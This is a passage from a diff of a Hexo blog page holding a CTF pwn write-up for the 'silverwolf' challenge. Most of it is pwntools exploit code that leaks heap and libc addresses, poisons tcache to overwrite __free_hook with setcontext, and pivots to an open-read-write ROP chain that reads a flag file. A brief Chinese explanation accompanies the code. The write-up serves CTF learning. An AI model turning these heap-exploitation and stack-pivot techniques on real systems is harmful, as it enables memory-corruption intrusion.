&#x27;)</span><br><span class="line">    malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">    libcbase=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(hex(libcbase))</span><br><span class="line">    free_hook=libcbase+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    environ=libcbase+libc.symbols[&#x27;environ&#x27;]</span><br><span class="line">    opens=libcbase+libc.symbols[&#x27;open&#x27;]</span><br><span class="line">    reads=libcbase+libc.symbols[&#x27;read&#x27;]</span><br><span class="line"></span><br><span class="line">    add(0,120)#0x78</span><br><span class="line">    #pause()</span><br><span class="line">    edit(0,&#x27;\x00&#x27;*0x68+p64(environ))</span><br><span class="line">    add(0,96)#environ</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">	stack = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">    #print(hex(stack))</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #pause()</span><br><span class="line">    add_stack=stack-0x120</span><br><span class="line">    print(hex(add_stack))</span><br><span class="line">    add(0,120)#0x78</span><br><span class="line">    dele(0)</span><br><span class="line">    #pause()</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(add_stack))</span><br><span class="line">    add(0,120)</span><br><span class="line">    #pause()</span><br><span class="line">    add(0,120)#stack</span><br><span class="line">    show(0)</span><br><span class="line">    #pause()</span><br><span class="line">    io.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">    main=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))+0x10</span><br><span class="line">    print(hex(main))</span><br><span class="line">   </span><br><span class="line">    #open(&#x27;./flag&#x27;,0)</span><br><span class="line">  </span><br><span class="line">    orw=p64(pop_rdi+libcbase)+p64(add_stack+0x60)+p64(pop_rsi+libcbase)+p64(0)+p64(opens)</span><br><span class="line">    #read(fd,buf,0x30)</span><br><span class="line">    orw+=p64(pop_rdi+libcbase)+p64(3)+p64(pop_rdx_rsi+libcbase)+p64(0x30)+p64(heapbase+0x10)+p64(reads)+p64(main)+&#x27;./flag\x00\x00&#x27;</span><br><span class="line">    #write(fd,buf,0x30)</span><br><span class="line">    #orw+=p64(pop_rdi+libcbase)+p64(1)+p64(pop_rsi+libcbase)+p64(heapbase+0x10)+p64(pop_rdx+libcbase)+p64(0x30)+&#x27;./flag\x00\x00&#x27;</span><br><span class="line">    print(len(orw))</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    edit(0,orw)</span><br><span class="line"></span><br><span class="line">    add(0,80)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(0)*2)</span><br><span class="line">    dele(0)</span><br><span class="line">    edit(0,p64(heapbase+0x10))</span><br><span class="line">    add(0,80)</span><br><span class="line">    add(0,80)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #io.recvuntil(&#x27;\n&#x27;,timeout=10000000)</span><br><span class="line">    show(0)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">                           </span><br></pre></td></tr></table></figure>
+
+<p>看了<a target="_blank" rel="noopener" href="https://ctf.njupt.edu.cn/613.html#silverwolf">南邮师傅们的博客</a>复现了一下,思路主要是，将rop写在堆上，用setcontext函数设置rsp的值也就是栈顶的地址，将栈转移到堆上，执行rop。</p>
+<p>正确exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">f-rom pwn import*</span><br><span class="line">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">def menu(ch):</span><br><span class="line">    p.sendlineafter(&#x27;choice:&#x27;,str(ch))</span><br><span class="line">def add(size):</span><br><span class="line">    menu(1)</span><br><span class="line">    p.sendlineafter(&#x27;Index:&#x27;,str(0))</span><br><span class="line">    p.sendlineafter(&#x27;Size:&#x27;,str(size))</span><br><span class="line">def edit(content):</span><br><span class="line">    menu(2)</span><br><span class="line">    p.sendlineafter(&#x27;Index:&#x27;,str(0))</span><br><span class="line">    p.sendlineafter(&#x27;Content:&#x27;,content)</span><br><span class="line">def show():</span><br><span class="line">    menu(3)</span><br><span class="line">    p.sendlineafter(&#x27;Index:&#x27;,str(0))</span><br><span class="line">def free():</span><br><span class="line">    menu(4)</span><br><span class="line">    p.sendlineafter(&#x27;Index:&#x27;,str(0))</span><br><span class="line">#p = process(&#x27;./silverwolf&#x27;)</span><br><span class="line">#elf = ELF(&#x27;./silverwolf&#x27;)</span><br><span class="line">#libc = elf.libc</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x78)</span><br><span class="line">    edit(&#x27;./flag\x00&#x27;)</span><br><span class="line">#pause()</span><br><span class="line">for i in range(2):</span><br><span class="line">    edit(&#x27;\x00&#x27;*0x10)</span><br><span class="line">    free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">heap_base = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))  - 0x5B0 - 0x940 - 0x70</span><br><span class="line">log.info(&#x27;HEAP:\t&#x27; + hex(heap_base))</span><br><span class="line">edit(p64(heap_base + 0x10))</span><br><span class="line">add(0x78)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(&#x27;\x00&#x27;*0x23 + &#x27;\x07&#x27;)</span><br><span class="line">#pause()</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(&#x27;\x7F&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;)) - libc.sym[&#x27;__malloc_hook&#x27;] - 0x70</span><br><span class="line">log.info(&#x27;LIBC:\t&#x27; + hex(libc_base))</span><br><span class="line"></span><br><span class="line">edit(&#x27;\x03&#x27;*0x40 + p64(libc_base + libc.sym[&#x27;__free_hook&#x27;]) + &#x27;\x00&#x27;*8*1 + p64(heap_base + 0x4000) + p64(heap_base + 0x3000 + 0x60) + p64(heap_base + 0x1000) + p64(heap_base + 0x10A0) + p64(heap_base + 0x3000))</span><br><span class="line">#pause()</span><br><span class="line">add(0x18)</span><br><span class="line"></span><br><span class="line">                                                                                        ########################</span><br><span class="line">pop_rdi_ret = libc_base + 0x00000000000215BF</span><br><span class="line">pop_rdx_ret = libc_base + 0x0000000000001B96</span><br><span class="line">pop_rax_ret = libc_base + 0x0000000000043AE8</span><br><span class="line">pop_rsi_ret = libc_base + 0x0000000000023EEA</span><br><span class="line">ret = libc_base + 0x00000000000008AA</span><br><span class="line">#pop_rax_ret=0x43a78 + libc_base</span><br><span class="line">#pop_rdx_rsi=0x130889 + libc_base</span><br><span class="line">#pop_rdi_ret=0x2155f + libc_base</span><br><span class="line">#pop_rsi_ret=0x23e8a + libc_base</span><br><span class="line">#pop_rdx_ret=0x1b96 + libc_base</span><br><span class="line"></span><br><span class="line">Open = libc_base + libc.sym[&#x27;open&#x27;]</span><br><span class="line">Read = libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">Write = libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">syscall = Read + 15</span><br><span class="line">FLAG  = heap_base + 0x4000</span><br><span class="line">gadget = libc_base + libc.sym[&#x27;setcontext&#x27;] + 53</span><br><span class="line"></span><br><span class="line">orw  = p64(pop_rdi_ret) + p64(FLAG)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(0)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(2)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(3)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base  + 0x3000)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(0x30)</span><br><span class="line">orw += p64(Read)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(1)</span><br><span class="line">orw += p64(Write)</span><br><span class="line"></span><br><span class="line">                                                                                        #############################</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">edit(p64(gadget))</span><br><span class="line">add(0x38)</span><br><span class="line">edit(&#x27;./flag\x00&#x27;)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(orw[:0x60])</span><br><span class="line">add(0x48)</span><br><span class="line">edit(orw[0x60:])</span><br><span class="line">add(0x68)</span><br><span class="line">edit(p64(heap_base + 0x3000) + p64(pop_rdi_ret + 1))</span><br><span class="line">add(0x58)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/10/cstc%E9%83%A8%E5%88%86pwn/" rel="prev" title="cstc部分pwn">
+      <i class="fa fa-chevron-left"></i> cstc部分pwn
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwny"><span class="nav-number">1.</span> <span class="nav-text">pwny</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lonelywolf"><span class="nav-number">2.</span> <span class="nav-text">lonelywolf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#silverwolf"><span class="nav-number">3.</span> <span class="nav-text">silverwolf</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ABf1ag</p>
+  <div class="site-description" itemprop="description">CTF to learn,not learn to CTF</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ABf1ag</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
